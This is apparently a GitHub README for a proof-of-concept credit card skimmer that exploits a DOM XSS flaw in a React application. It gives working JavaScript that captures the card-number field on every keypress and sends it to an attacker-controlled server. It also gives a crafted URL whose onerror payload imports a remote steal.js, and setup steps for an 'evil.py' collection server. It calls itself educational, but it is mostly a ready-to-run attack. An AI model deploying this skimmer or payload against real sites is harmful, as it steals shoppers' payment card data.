# Simple Credit Card Theft POC

This exploit takes advantage of a DOM XSS security issue on a react application. The user is tricked into clicking on a crafted URL which loads malicious javascript from an external server. This javascript reads the form field containing the credit card number and sends it to the attacker owned server. This is for educational purposes only :)

![Alt text](/img/cc_collection.png "Optional title")


On every keypress, read the data containing the credit card number and send it to the attacker controlled server via a `GET` request.
```
function sendreq(cc) {
    var url = "http://localhost:8000?cc=" + cc;
    var req = new XMLHttpRequest();
    req.open("GET", url, true);
    req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    req.send();
}

document.addEventListener('keydown', (event) => {
    sendreq(document.querySelector('form')[2].textContent);
}, false);
```

# Setup

## Terminal 1
`git clone https://github.com/thecasual/xss_cc_skimmer_poc`

`cd xss_cc_skimmer_poc/xss`

`npm install .`

`npm start`


## Terminal 2
`cd xss_cc_skimmer_poc/server2`

`python .\evil.py`

Navigate: `http://localhost:3000/?name=%3Cbutton%3E%27%3E%3Cimg%20src=x%20onerror=import(%22http://localhost:8000/steal.js%22)%3E%3C/button%3E`


Have fun!